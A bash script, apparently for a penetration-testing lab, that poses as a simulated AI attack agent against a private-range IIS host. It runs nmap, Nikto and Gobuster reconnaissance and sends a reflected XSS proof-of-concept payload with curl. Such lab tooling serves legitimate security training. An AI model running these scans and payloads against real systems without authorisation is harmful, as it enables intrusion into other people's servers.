#!/bin/bash
# WinHunt 2-Day Automation Agent - Focus: Web (IIS)
# IP of the Windows IIS Target (192.168.56.21)
TARGET_IP="192.168.56.21"
EVIDENCE_DIR="/home/vagrant/evidence"
mkdir -p "$EVIDENCE_DIR"

# --- SIMULATED AI AGENT KNOWLEDGE BASE ---
# Function to execute a specific attack module
attack_module() {
    MODULE_NAME=$1
    echo "--- Agent: Running module $MODULE_NAME on $TARGET_IP ---"

    case $MODULE_NAME in
        "RECON_NMAP")
            echo "Knowledge: Starting comprehensive port and service scan."
            nmap -sS -sV -A -Pn "$TARGET_IP" -oN "$EVIDENCE_DIR/nmap_iis.txt"
            ;;

        "RECON_WEB_SCAN")
            echo "Knowledge: Initiating vulnerability and directory enumeration (Nikto & Gobuster)."
            nikto -h http://"$TARGET_IP" -output "$EVIDENCE_DIR/nikto_iis.txt"
            gobuster dir -u http://"$TARGET_IP" -w /usr/share/wordlists/dirb/common.txt -o "$EVIDENCE_DIR/gobuster_iis.txt"
            ;;

        "EXPLOIT_XSS")
            echo "Knowledge: Attempting Reflected XSS exploitation."
            # The vulnerable payload (proof of concept)
            XSS_PAYLOAD="<script>alert('XSS')</script>"
            curl "http://$TARGET_IP/?name=$XSS_PAYLOAD" -s | grep -A 2 'Reflected'
            ;;

        "ALL")
            echo "Knowledge: Executing full attack sequence."
            attack_module "RECON_NMAP"
            attack_module "RECON_WEB_SCAN"
            attack_module "EXPLOIT_XSS"
            ;;

        *)
            echo "Error: Unknown module $MODULE_NAME."
            echo "Available modules: RECON_NMAP, RECON_WEB_SCAN, EXPLOIT_XSS, ALL."
            ;;
    esac
    echo "--- Module $MODULE_NAME Complete ---"
}
# --- END AGENT KNOWLEDGE BASE ---

# --- MAIN EXECUTION ---
if [ "$#" -eq 0 ]; then
    echo "Usage: ./winhunt_agent.sh <module_name>"
    echo "Example: ./winhunt_agent.sh RECON_NMAP"
    echo "Example: ./winhunt_agent.sh ALL"
else
    attack_module "$1"
fi